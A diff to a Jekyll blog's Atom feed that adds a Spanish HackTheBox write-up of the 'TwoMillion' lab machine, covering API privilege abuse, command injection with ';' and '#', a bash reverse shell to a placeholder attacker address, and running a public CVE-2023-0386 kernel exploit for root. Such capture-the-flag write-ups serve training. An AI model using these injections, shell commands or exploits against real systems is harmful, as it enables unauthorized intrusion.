@@ -1,4 +1,211 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.6.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-07-21T13:45:45-05:00</updated><id>http://localhost:4000/</id><title>Al3xt0r</title><subtitle>Tengo problemas de adiccion.</subtitle><entry><title>Htb Inject</title><link href="http://localhost:4000/HTB-Inject/" rel="alternate" type="text/html" title="Htb Inject" /><published>2023-06-16T00:00:00-05:00</published><updated>2023-06-16T00:00:00-05:00</updated><id>http://localhost:4000/HTB-Inject</id><content type="html" xml:base="http://localhost:4000/HTB-Inject/">&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Injection/Inject.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom"><generator uri="http://jekyllrb.com" version="3.6.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-07-23T19:06:16-05:00</updated><id>http://localhost:4000/</id><title>Al3xt0r</title><subtitle>Tengo problemas de adiccion.</subtitle><entry><title>Htb Twomillion</title><link href="http://localhost:4000/HTB-TwoMillion/" rel="alternate" type="text/html" title="Htb Twomillion" /><published>2023-07-23T00:00:00-05:00</published><updated>2023-07-23T00:00:00-05:00</updated><id>http://localhost:4000/HTB-TwoMillion</id><content type="html" xml:base="http://localhost:4000/HTB-TwoMillion/">&lt;h2 id=&quot;begin&quot;&gt;Begin&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM0.png&quot; alt=&quot;&quot; /&gt;
+Esta maquina es un tanto interesante, pese a ser easy… Tiene unos conceptos de explotacion de Kernel llamativo.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Lista de lo que veremos en esta machine:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Reconocimiento de puertos&lt;/li&gt;
+  &lt;li&gt;Explotacion de vulnerabilidades del kernel&lt;/li&gt;
+  &lt;li&gt;Javascript functions&lt;/li&gt;
+  &lt;li&gt;RCE vulnerando la API&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;reconocimiento&quot;&gt;Reconocimiento&lt;/h2&gt;
+
+&lt;p&gt;Usamos los scripts de &lt;strong&gt;reconocimiento&lt;/strong&gt; con la herramienta &lt;strong&gt;nmap&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 65535 &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &amp;lt;IP&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;O tambien podemos usar:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &amp;lt;IP de la Maquina&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Y para agilizar trabajo, usaremos los puertos descubiertos para obtener informacion de los servicios y versiones que estan tras estos:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Podemos ver solo 2 servicios expuestos:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;22 Perteneciente a un OpenSSH de un sistema &lt;strong&gt;Ubuntu&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;80 Perteneciente a HTTP&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Si le tiramos una herramienta de reconocimiento web, veremos que no la IP nos hace un &lt;strong&gt;redirect&lt;/strong&gt; a un host, que vamos a tener que agregarlo al &lt;strong&gt;/etc/hosts&lt;/strong&gt;
+Lo podemos hacer de manera rapida con un:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;IP&amp;gt; 2million.htb&quot;&lt;/span&gt; | tree &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; /etc/hosts
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Al ir a la pagina, podremos ver una interfaz… Interesante:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo que nos llama la atencion aqui, es que:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Hay un panel de &lt;strong&gt;LOGIN&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;Hay un panel de &lt;strong&gt;JOIN&lt;/strong&gt;, que seria el equivalente a un registro.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Si vamos al panel de &lt;strong&gt;JOIN&lt;/strong&gt;, veremos lo siguiente:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;intrusion&quot;&gt;Intrusion&lt;/h2&gt;
+
+&lt;p&gt;Si damos un &lt;strong&gt;CTL+U&lt;/strong&gt;, podremos ver el codigo fuente de la pagina… Y nos toparemos con algo interesante:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si vemos la funcion &lt;strong&gt;inviteapi.min.js&lt;/strong&gt;, veremos lo siguiente:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos la linea interesante de:&lt;/p&gt;
+
+&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;invite&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;verifyInviteCode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;makeInviteCode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;how&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;generate&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;verify&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Asi que podemos interactuar con la consola usando &lt;strong&gt;verifyInviteCode&lt;/strong&gt; y tambien &lt;strong&gt;makeInviteCode&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que esta encriptado en &lt;strong&gt;ROT13&lt;/strong&gt; o cifrado CESAR.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Resumiendo el cifrado &lt;strong&gt;CESAR&lt;/strong&gt;, tomas las letras del alfabeto, les asigna una posicion &lt;strong&gt;numerica&lt;/strong&gt;  y las va rotando de acuerdo a su posicion, ejemplificando rapido… Si tenemos una ROT13, y queremos encriptar un &lt;strong&gt;“HOLA”&lt;/strong&gt;, aplicando del cifrado &lt;strong&gt;CESAR&lt;/strong&gt;, tendremos como resultado un: &lt;strong&gt;“UBYN”&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Bueno, si la desciframos obtendremos:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo que nos pide que hagamos una peticion por el metodo &lt;strong&gt;POST&lt;/strong&gt; a la direccion: &lt;strong&gt;/api/v1/invite/generate&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; POST http://2million.htb/api/v1/invite/generate
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Si lo hacemos, obtendemos un codigo en &lt;strong&gt;base64&lt;/strong&gt;, por lo que debemos desencriptarlo y obtendemos el codigo de invitacion:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Solo nos queda registarnos y logearnos en la pagina:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez dentro veremos:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo que nos interesa es el apartado de &lt;strong&gt;ACCESS&lt;/strong&gt;, esto se debe a que aqui es donde creamos y descargamos nuestra &lt;strong&gt;VPN&lt;/strong&gt;, pero no olvidemos que se aplica una query a la API del servicio.&lt;/p&gt;
+
+&lt;p&gt;Abrimos &lt;strong&gt;BURPSUITE&lt;/strong&gt; e interceptamos la peticion:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que le hace un &lt;strong&gt;GET&lt;/strong&gt; a la API, pero queremos enumerar consultas interesantes, asi que vamos directamente a la API, tirando el &lt;strong&gt;GET&lt;/strong&gt; a la ruta: &lt;strong&gt;“/api/v1”&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos algunos metodos interesante, en especial los de tipo &lt;strong&gt;admin&lt;/strong&gt;, por lo que vamos a aprovecharnos de eso:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Al atentar contra la ruta: &lt;strong&gt;“/api/v1/admin/settings/update”&lt;/strong&gt;, vemos que el mensaje es “Invalid CONTENT TYPE”, por lo que nos da indicios que deberiamos pasar parametros, asi que indicamos un &lt;strong&gt;Content-Type: application/json&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Veremos que ahora nos pide un parametro: &lt;strong&gt;email&lt;/strong&gt;, por lo que lo introduciremos a nuestro cuerpo JSON.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y ahora nos pide el parametro: &lt;strong&gt;is_admin&lt;/strong&gt;, por lo que podemos decir que es una variable tipo Booleana, es decir: &lt;strong&gt;1 or 0&lt;/strong&gt;, o tambien &lt;strong&gt;TRUE o FALSE&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM18.png&quot; alt=&quot;&quot; /&gt;
+&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM19.png&quot; alt=&quot;&quot; /&gt;
+Ahora vemos que nos hemos vuelto administradores, por lo que atentaremos contra la ruta de generar VPN pero del administrador:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora tendremos que ver una forma de escapar comandos, por lo que podemos intentar poner un “;” y un “#” al final del parametro, esto debido a que el “;” creara una escapada de comando, y el “#” a comentar el resto de la peticion:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como podemos ver, ahora tenemos ejecucion remota de comandos (RCE), por lo que queda ganar acceso a la maquina.&lt;/p&gt;
+
+&lt;p&gt;No olvidemos la reverse shell basica en &lt;strong&gt;bash&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'bash -i &amp;gt;&amp;amp;/dev/tcp/&amp;lt;TU IP&amp;gt;/&amp;lt;TU PUERTO&amp;gt; 0&amp;gt;&amp;amp;1'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que ganamos acceso como el usuario &lt;strong&gt;“www-data”&lt;/strong&gt;, por lo que nos queda escalar privilegios al usuario y luego al root.&lt;/p&gt;
+
+&lt;p&gt;Si vemos, estamos dentro del directorio de la pagina web, listamos todos los archivos, vemos un listado interesante:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Database.php&lt;/li&gt;
+  &lt;li&gt;Router.php&lt;/li&gt;
+  &lt;li&gt;index.php&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Pero si los leemos, nos daremos cuenta, que llama a una variable privada, por lo que nos vamos a poner a analizar todos esos archivos:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Nos vamos a topar algo interesante dentro del archivo &lt;strong&gt;index&lt;/strong&gt;, en lo que parece ser un &lt;strong&gt;archivo de entorno php&lt;/strong&gt;, si deseas leer mas de esto, dale &lt;a href=&quot;https://desarrolloweb.com/articulos/variables-entorno-php-env.html&quot;&gt;click aqui&lt;/a&gt;, el caso:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos lo siguiente:&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$envFile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'.env'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$envVariables&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$envFile&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;$envVariables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$dbHost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$envVariables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_HOST'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$dbName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$envVariables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_DATABASE'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$dbUser&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$envVariables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_USERNAME'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$dbPass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$envVariables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_PASSWORD'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Por lo que podemos deducir, que hay un archivo oculto, asi que vemos archivos ocultos y sorpresa:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Por lo que ya tenemos las credenciales del &lt;strong&gt;USUARIO NO PRIVILEGIADO&lt;/strong&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;escalada-de-privilegios-privesc&quot;&gt;Escalada de Privilegios (PRIVESC)&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez como el usuario “admin”, nos tocara investigar cositas… Pero ahorrando trabajo, no tenemos permisos a nivel de &lt;strong&gt;SUDOERS&lt;/strong&gt;, pero podemos ver algo interesante:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que estamos contra un Kernel un tanto curioso… Si hacemos una busqueda rapida por &lt;strong&gt;Google&lt;/strong&gt;, nos toparemos con unos CVE que nos indican una escalada de privilegios:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Aqui tenemos el link de actualizacion de seguridad de &lt;a href=&quot;https://ubuntu.com/security/notices/LSN-0095-1&quot;&gt;UBUNTU&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;Aqui: &lt;a href=&quot;https://github.com/sxlmnwb/CVE-2023-0386&quot;&gt;Link del CVE Usado&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Bueno, mostrado esto:&lt;/p&gt;
+&lt;h3 id=&quot;cve-2023-0386&quot;&gt;CVE-2023-0386&lt;/h3&gt;
+&lt;p&gt;Explicado de manera resumida, aprovecha la mala implementacion de un complemento: &lt;strong&gt;“OverlayFS”&lt;/strong&gt;, este permite lectura y escritura dentro de un arbol de directorios.&lt;/p&gt;
+
+&lt;p&gt;Lo traeremos a la maquina victima, dentro del directorio &lt;strong&gt;/tmp&lt;/strong&gt; y lo ejecutaremos como indica en su repo de GitHub:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;make all&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; ./fuse ./ovlcap/lower ./gc
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Y en otra terminal, corremos el ./exp y ya tendremos acceso como &lt;strong&gt;ROOT&lt;/strong&gt;, por lo que podemos decir… Maquina superada.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_TwoMillion/TM29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;fin&quot;&gt;FIN&lt;/h2&gt;</content><author><name>al3xt0r</name></author><category term="CTF" /><category term="HackTheBox" /><category term="WriteUp" /><category term="RCE" /><summary></summary></entry><entry><title>Htb Inject</title><link href="http://localhost:4000/HTB-Inject/" rel="alternate" type="text/html" title="Htb Inject" /><published>2023-06-16T00:00:00-05:00</published><updated>2023-06-16T00:00:00-05:00</updated><id>http://localhost:4000/HTB-Inject</id><content type="html" xml:base="http://localhost:4000/HTB-Inject/">&lt;p&gt;&lt;img src=&quot;/assets/img/HTB_Injection/Inject.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;en-esta-maquina-veremos&quot;&gt;En esta maquina veremos:&lt;/h2&gt;
 &lt;ul&gt;
